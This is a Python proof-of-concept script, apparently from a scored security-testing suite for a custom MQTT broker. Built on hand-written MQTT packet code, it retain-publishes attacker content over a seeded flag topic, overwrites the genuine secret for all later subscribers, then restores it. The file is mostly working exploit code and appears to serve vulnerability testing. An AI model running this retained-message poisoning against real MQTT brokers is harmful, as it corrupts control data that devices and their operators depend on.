#!/usr/bin/env python3
"""
PoC #3: Retained-message poisoning
------------------------------------
Location: Broker._handle_subscribe() in mqb/broker.py. On every SUBSCRIBE,
the broker immediately delivers whatever retained message matches the new
filter (standard MQTT 3.1.2.4 behaviour) with NO check on who set that
retained message, when, or whether the new subscriber has any relationship
to whoever last published it. There is also no PUBLISH ownership check
anywhere in this broker (see Broker._handle_publish()), so any client can
retain-PUBLISH to ANY topic, including one it has no business writing to.

The scoreable target: at startup, MQB pre-seeds a RETAINED message on a
fixed, documented topic (MQB_FLAG_TOPIC, default "fleet/control/flag")
carrying the real per-deployment secret MQB_FLAG (see
Broker.seed_startup_state() in mqb/broker.py) -- exactly what PoC #2 reads
via a "#" subscribe. This PoC targets the WRITE side of the same missing
check: an attacker retain-PUBLISHes poisoned content straight over that
same topic, permanently replacing the real secret (until someone
retain-publishes the genuine value again) for every subscriber from then on
-- not a throwaway topic the PoC invented for itself.

Steps: (1) a bystander subscribes to the flag topic BEFORE the attack and
records what's really there (the seeded flag, planted by the broker itself,
not by this PoC); (2) the attacker retain-PUBLISHes poison to that exact
topic with no credentials tying it to whatever legitimate device/controller
normally owns it; (3) a fresh subscriber -- standing in for any future
device or the harness's own re-check -- connects for the first time and
receives the attacker's poison instead of the real secret, proving the
genuine value's persistence was defeated broker-wide, not just for the
attacker's own view.

Run: python3 03_retained_message_poisoning.py [host] [port]
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
PASSWORD = os.environ.get("MQB_REQUIREPASS")
FLAG_TOPIC = os.environ.get("MQB_FLAG_TOPIC", "fleet/control/flag")
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")


def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, keep_alive=30, password=None):
    flags = (clean_session & 1) << 1
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_publish(topic, payload, qos=0, retain=0, packet_id=1):
    flags = (qos & 3) << 1 | (retain & 1)
    body = _u8(topic)
    if qos > 0:
        body += struct.pack("!H", packet_id)
    body += payload
    return bytes([0x30 | flags]) + _rl(len(body)) + body


def build_subscribe(filters, packet_id=1):
    body = struct.pack("!H", packet_id)
    for f, q in filters:
        body += _u8(f) + bytes([q])
    return bytes([0x82]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    first = sock.recv(1)
    if not first:
        return None
    ptype = first[0] >> 4
    mult, val = 1, 0
    while True:
        b = sock.recv(1)[0]
        val += (b & 0x7F) * mult
        if not (b & 0x80):
            break
        mult *= 128
    body = b""
    while len(body) < val:
        chunk = sock.recv(val - len(body))
        if not chunk:
            break
        body += chunk
    return ptype, body


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def read_retained(client_id):
    """Connect fresh, subscribe once to FLAG_TOPIC, and return whatever
    retained payload (if any) comes back immediately."""
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(build_connect(client_id, password=PASSWORD))
    recv_packet(s)  # CONNACK
    s.sendall(build_subscribe([(FLAG_TOPIC, 0)]))
    recv_packet(s)  # SUBACK
    ptype, body = recv_packet(s, timeout=3.0) or (None, b"")
    s.close()
    if ptype != 3:  # PUBLISH
        return None
    offset = 2 + struct.unpack_from("!H", body, 0)[0]
    return body[offset:]


def main():
    _wait_for_server()

    token = uuid.uuid4().hex[:12]
    poison = f"POISONED-BY-ATTACKER-{token}".encode()

    # 1. A bystander subscribes first and records what's genuinely there --
    #    the flag the broker itself seeded at startup, never touched by this
    #    PoC.
    before = read_retained(f"poc3-bystander-{token}")
    before_flag = FLAG_RE.search(before or b"")

    # 2. The attacker retain-PUBLISHes poison straight over the real secret's
    #    topic. Nothing here authenticates it as the fleet controller (or
    #    anything at all beyond "some TCP client").
    attacker = socket.create_connection((HOST, PORT), timeout=10)
    attacker.sendall(build_connect(f"poc3-attacker-{token}", password=PASSWORD))
    recv_packet(attacker)  # CONNACK
    attacker.sendall(build_publish(FLAG_TOPIC, poison, qos=0, retain=1))
    time.sleep(0.3)
    attacker.close()

    # 3. A fresh subscriber -- standing in for any future device, or a
    #    harness re-verifying the flag is still intact -- gets whatever is
    #    there NOW.
    after = read_retained(f"poc3-future-subscriber-{token}")

    print(f"[*] before the attack, {FLAG_TOPIC!r} held: {before!r} "
          f"(real flag present: {bool(before_flag)})")
    print(f"[*] attacker retain-PUBLISHed poison to {FLAG_TOPIC!r} with no ownership check")
    print(f"[*] after the attack, a brand-new subscriber to {FLAG_TOPIC!r} received: {after!r}")

    poisoned = after == poison and after != before
    if poisoned and before_flag:
        print(f"[+] Confirmed: retained-message poisoning overwrote the real per-deployment "
              f"secret on {FLAG_TOPIC!r} -- every future subscriber (not just the attacker) "
              f"now gets the attacker's payload instead of {before_flag.group(0).decode()!r}, "
              f"until someone retain-publishes the genuine value again")
        # The proof above is complete; the pass/fail verdict is already decided.
        # Now put the genuine seeded secret back on the topic ("someone
        # retain-publishes the genuine value again", exactly as the docstring
        # describes a real device doing). This is cleanup, not part of the
        # scored claim: it stops this PoC's side effect from clobbering the
        # same broker-seeded retained flag that the later topic-based PoCs in
        # numeric order (notably #4's Client-ID hijack) need to steal, so
        # running the full suite against one broker instance stays order-
        # independent. The restored value is the broker's own `before`, never
        # a value this PoC invented.
        restore = socket.create_connection((HOST, PORT), timeout=10)
        restore.sendall(build_connect(f"poc3-restore-{token}", password=PASSWORD))
        recv_packet(restore)  # CONNACK
        restore.sendall(build_publish(FLAG_TOPIC, before, qos=0, retain=1))
        time.sleep(0.3)
        restore.close()
        if read_retained(f"poc3-restore-check-{token}") == before:
            print(f"[*] genuine retained secret restored on {FLAG_TOPIC!r} "
                  f"(cleanup, so later PoCs against this same broker are unaffected)")
        return 0
    print("[-] Could not confirm the retained flag was poisoned")
    return 1


if __name__ == "__main__":
    sys.exit(main())
